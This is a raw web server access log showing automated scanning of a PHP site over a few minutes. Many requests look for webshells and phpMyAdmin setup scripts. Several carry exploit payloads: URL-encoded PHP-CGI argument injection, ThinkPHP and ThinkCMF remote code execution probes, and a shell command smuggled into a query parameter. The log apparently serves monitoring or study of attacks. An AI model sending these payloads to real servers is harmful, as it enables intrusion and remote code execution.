- - [08/Jul/2020:06:31:21 +0000] "CONNECT github.com:443 HTTP/1.1" 200 2387 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36"
- - [08/Jul/2020:06:31:25 +0000] "\x16\x03\x01\x01\x01\x01" 400 0 "-" - "-"
- - [08/Jul/2020:06:47:09 +0000] "GET / HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [08/Jul/2020:06:47:09 +0000] "GET /robots.txt HTTP/1.1" 200 437 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [08/Jul/2020:06:47:10 +0000] "POST /Admina43428a0/Login.php HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0"
- - [08/Jul/2020:06:47:11 +0000] "GET / HTTP/1.1" 200 1309 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [08/Jul/2020:06:47:12 +0000] "GET /l.php HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [08/Jul/2020:06:47:12 +0000] "GET /phpinfo.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [08/Jul/2020:06:47:13 +0000] "GET /test.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:28.0) Gecko/20100101 Firefox/28.0"
- - [08/Jul/2020:06:47:19 +0000] "POST /index.php HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [08/Jul/2020:06:47:19 +0000] "POST /bbs.php HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [08/Jul/2020:06:47:20 +0000] "POST /forum.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [08/Jul/2020:06:47:23 +0000] "POST /bbs/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [08/Jul/2020:06:47:24 +0000] "POST /forum/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [08/Jul/2020:06:47:25 +0000] "POST /forums/index.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:31.0) Gecko/20100101 Firefox/31.0"
- - [08/Jul/2020:06:47:26 +0000] "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
- - [08/Jul/2020:06:47:26 +0000] "POST /cgi-bin/php5?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
- - [08/Jul/2020:06:47:31 +0000] "POST /cgi-bin/php-cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
- - [08/Jul/2020:06:47:32 +0000] "POST /cgi-bin/php.cgi?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
- - [08/Jul/2020:06:47:33 +0000] "POST /cgi-bin/php4?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0"
- - [08/Jul/2020:06:47:34 +0000] "POST /%62%61%73%65/%70%6F%73%74%2E%70%68%70 HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"
- - [08/Jul/2020:06:47:35 +0000] "GET /webdav/ HTTP/1.1" 404 1835 "-" - "Mozilla/5.0"
- - [08/Jul/2020:06:47:47 +0000] "GET /_query.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:47:48 +0000] "GET /test.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:47:51 +0000] "GET /db_cts.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:47:52 +0000] "GET /db_pma.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:47:55 +0000] "GET /logon.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:47:56 +0000] "GET /help-e.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:47:59 +0000] "GET /license.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:00 +0000] "GET /log.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:01 +0000] "GET /hell.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:03 +0000] "GET /x.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:07 +0000] "GET /htdocs.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:08 +0000] "GET /b.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:09 +0000] "GET /sane.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:09 +0000] "GET /desktop.ini.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:10 +0000] "GET /z.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:11 +0000] "GET /lala.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:12 +0000] "GET /lala-dpr.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:14 +0000] "GET /wpc.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:15 +0000] "GET /t6nv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:16 +0000] "GET /muhstik.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:17 +0000] "GET /text.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:19 +0000] "GET /wp-config.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:20 +0000] "GET /muhstik.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:31 +0000] "GET /muhstik-dpr.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:32 +0000] "GET /lol.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:35 +0000] "GET /uploader.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:36 +0000] "GET /cmd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:39 +0000] "GET /cmv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:40 +0000] "GET /cmdd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:43 +0000] "GET /knal.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:44 +0000] "GET /cmd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:47 +0000] "GET /shell.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:49 +0000] "GET /appserv.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:51 +0000] "GET /scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:52 +0000] "GET /phpmyadmin/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:55 +0000] "GET /phpMyAdmin/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:56 +0000] "GET /scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:48:57 +0000] "GET /phpmyadmin/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:03 +0000] "GET /pma/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:04 +0000] "GET /PMA/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:05 +0000] "GET /myadmin/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:06 +0000] "GET /MyAdmin/scripts/setup.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:08 +0000] "GET /PMA/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:09 +0000] "GET /myadmin/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:10 +0000] "GET /MyAdmin/scripts/db___.init.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:11 +0000] "GET /cacti/plugins/weathermap/editor.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:13 +0000] "GET /weathermap/editor.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:15 +0000] "GET /index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:19 +0000] "GET /elrekt.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50 HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:22 +0000] "GET /App/?content=die(md5(HelloThinkPHP)) HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:23 +0000] "GET /index.php/module/action/param1/${@die(md5(HelloThinkPHP))} HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:24 +0000] "GET /index.php?s=/module/action/param1/${@die(md5(HelloThinkPHP))} HTTP/1.1" 200 2442 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:27 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 2442 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:28 +0000] "GET / HTTP/1.1" 200 2442 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:28 +0000] "GET /joomla/ HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:35 +0000] "GET /?a=echo%20-n%20HelloNginx%7Cmd5sum HTTP/1.1" 200 2443 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:36 +0000] "GET /d7.php HTTP/1.1" 404 1871 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:39 +0000] "GET /1x.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:40 +0000] "GET /home.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:43 +0000] "GET /undx.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:44 +0000] "GET /spider.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:47 +0000] "GET /payload.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:51 +0000] "GET /izom.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:52 +0000] "GET /composer.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:55 +0000] "GET /hue2.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:56 +0000] "GET /Drupal.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:49:59 +0000] "GET /lang.php?f=1 HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:00 +0000] "GET /izom.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:01 +0000] "GET /payload.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:03 +0000] "GET /images/!.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:04 +0000] "GET /images/vuln.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:05 +0000] "GET /hd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:07 +0000] "GET /images/attari.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:08 +0000] "GET /images/jsspwneed.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:09 +0000] "GET /images/stories/cmd.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:11 +0000] "GET /up.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:12 +0000] "GET /laravel.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:13 +0000] "GET /huoshan.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:13 +0000] "GET /yu.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:14 +0000] "GET /floaw.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:15 +0000] "GET /ftmabc.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
- - [08/Jul/2020:06:50:16 +0000] "GET /doudou.php HTTP/1.1" 404 1872 "-" - "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.91 Safari/537.36"
